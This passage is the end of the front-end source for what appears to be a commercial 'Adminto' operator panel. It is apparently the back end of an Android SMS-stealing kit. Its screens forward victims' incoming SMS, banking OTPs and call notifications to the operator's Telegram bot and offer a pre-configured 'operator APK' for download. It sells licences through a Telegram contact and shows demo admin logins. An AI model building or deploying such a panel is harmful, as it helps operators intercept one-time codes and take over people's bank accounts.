                    )}
                    <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)' }}>
                      <p style={{ fontSize: '0.82rem', color: '#38bdf8' }}>
                        📲 Forward incoming SMS, Banking OTPs, and Call notifications instantly to your private Telegram Bot or Channel.
                      </p>
                    </div>
                    <div>
                      <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Telegram Bot Token</label>
                      <input type="text" className="search-input" value={telegramBotToken} onChange={(e) => setTelegramBotToken(e.target.value)} placeholder="123456789:ABCdefGhIJKlmNoPQ..." />
                    </div>
                    <div>
                      <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Telegram Chat ID / Channel ID</label>
                      <input type="text" className="search-input" value={telegramChatId} onChange={(e) => setTelegramChatId(e.target.value)} placeholder="-100123456789 or @my_channel" />
                    </div>
                    <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #0284c7, #38bdf8)' }}>
                      💬 Connect Telegram Bot Forwarding
                    </button>
                  </form>
                )}

                {/* Sub-Tab 4: Sessions */}
                {settingsSubTab === 'sessions' && (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                    <div className="glass-panel" style={{ padding: '1.25rem' }}>
                      <h4 style={{ color: '#fff', fontSize: '0.95rem', marginBottom: '8px' }}>👤 Current Operator Session</h4>
                      <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '6px' }}>
                        <div>Username: <strong style={{ color: '#fff' }}>{adminUser?.username}</strong></div>
                        <div>Session Scope: <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'Default Scope'}</code></div>
                        <div>Status: <span style={{ color: '#34d399', fontWeight: 600 }}>🟢 Active Now</span></div>
                      </div>
                    </div>

                    <button className="btn-primary" onClick={handleTerminateAllSessions} style={{ background: 'linear-gradient(135deg, #dc2626, #ef4444)', width: '100%', padding: '0.8rem' }}>
                      🚪 Terminate All Active Sessions
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Change Password Modal Overlay */}
          {showChangePassModal && (
            <div className="modal-overlay" onClick={() => setShowChangePassModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '400px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <h3 style={{ color: '#fff' }}>🔒 Change Password</h3>
                  <button onClick={() => setShowChangePassModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                {changePassStatus && (
                  <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: changePassStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: changePassStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
                    {changePassStatus}
                  </div>
                )}

                <form onSubmit={handleChangePasswordSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Logged-in Operator Account</label>
                    <input type="text" className="search-input" value={adminUser?.username} disabled style={{ opacity: 0.7 }} />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>New Password</label>
                    <input 
                      type="password" 
                      className="search-input" 
                      placeholder="Enter new password" 
                      value={newPassInput} 
                      onChange={(e) => setNewPassInput(e.target.value)} 
                      required 
                    />
                  </div>
                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem', marginTop: '0.5rem' }}>
                    Update Password
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Download Operator APK Modal Overlay */}
          {showApkModal && (
            <div className="modal-overlay">
              <div className="glass-panel modal-content" style={{ maxWidth: '640px' }}>
                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>📲 Download Custom Operator APK</h3>
                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Pre-configured Android App linked directly to your database</p>
                  </div>
                  <button onClick={() => setShowApkModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(16,185,129,0.3)', background: 'rgba(16,185,129,0.05)' }}>
                    <h4 style={{ color: '#34d399', fontSize: '0.9rem', marginBottom: '8px' }}>🛡️ Embedded Operator Credentials</h4>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem', fontSize: '0.8rem' }}>
                      <div><span style={{ color: '#9ca3af' }}>Operator:</span> <strong style={{ color: '#fff' }}>{adminUser?.username}</strong></div>
                      <div><span style={{ color: '#9ca3af' }}>Firebase Project ID:</span> <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'adminto-default'}</code></div>
                      <div><span style={{ color: '#9ca3af' }}>Organization Scope:</span> <code style={{ color: '#c084fc' }}>{adminUser?.firebaseConfig?.orgId || 'org_main'}</code></div>
                      <div><span style={{ color: '#9ca3af' }}>Status:</span> <span style={{ color: '#34d399', fontWeight: 600 }}>✓ Verified</span></div>
                    </div>
                  </div>

                  <div>
                    <button type="button" className="btn-primary" onClick={handleDownloadApkFile} style={{ background: 'linear-gradient(135deg, #10b981, #059669)', width: '100%', justifyContent: 'center', padding: '0.9rem', fontSize: '1rem' }}>
                      📥 Download Official Android APK (12.2 MB)
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Login Modal Overlay if not logged in */}
          {!adminUser && (
            <div className="modal-overlay">
              <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '2.5rem 2rem' }}>
                <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
                  <div className="brand-icon" style={{ margin: '0 auto 1rem', width: '56px', height: '56px', borderRadius: '16px' }}>🛡️</div>
                  <h2 style={{ fontSize: '1.6rem', color: '#fff', marginBottom: '4px' }}>Adminto Portal</h2>
                  <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Dedicated Admin Database Authentication</p>
                </div>

                {loginError && (
                  <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1.25rem', textAlign: 'center' }}>
                    {loginError}
                  </div>
                )}

                <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div>
                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Username or Email</label>
                    <input 
                      type="text" 
                      className="search-input" 
                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
                      value={loginUser}
                      onChange={(e) => setLoginUser(e.target.value)}
                      placeholder="admin"
                    />
                  </div>

                  <div>
                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Password</label>
                    <input 
                      type="password" 
                      className="search-input" 
                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
                      value={loginPass}
                      onChange={(e) => setLoginPass(e.target.value)}
                      placeholder="••••••••"
                    />
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem' }}>
                    Sign In
                  </button>
                </form>

                <div style={{ marginTop: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                  <a 
                    href="https://t.me/tejashal" 
                    target="_blank" 
                    rel="noopener noreferrer" 
                    style={{ textDecoration: 'none' }}
                  >
                    <button 
                      type="button" 
                      className="btn-secondary" 
                      style={{ 
                        width: '100%', 
                        padding: '0.75rem', 
                        color: '#38bdf8', 
                        border: '1px solid rgba(56, 189, 248, 0.4)', 
                        background: 'rgba(56, 189, 248, 0.08)',
                        fontWeight: 600,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: '8px'
                      }}
                    >
                      🛒 Buy License
                    </button>
                  </a>
                </div>

                <div style={{ marginTop: '1.5rem', paddingTop: '1rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.75rem', color: '#9ca3af', textAlign: 'center' }}>
                  <div>Try active operator: <code style={{ color: '#93c5fd' }}>operator1 / operator123</code></div>
                  <div style={{ marginTop: '4px' }}>Try Super Admin: <code style={{ color: '#ec4899' }}>admin / admin123</code></div>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
  </script>
<?php include_once __DIR__ . '/footer.php'; ?>
